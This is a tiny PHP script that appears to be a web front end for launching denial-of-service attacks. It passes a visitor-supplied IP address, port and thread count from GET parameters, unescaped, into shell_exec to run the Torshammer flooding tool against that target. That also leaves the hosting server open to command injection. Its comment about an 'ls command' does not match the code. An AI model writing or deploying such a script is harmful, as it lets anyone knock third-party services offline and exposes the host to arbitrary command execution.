<?php

// Use ls command to shell_exec
// function
$output = shell_exec('python3 ./scripts/ThorHammer/Torshammer 1.0/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);

?>
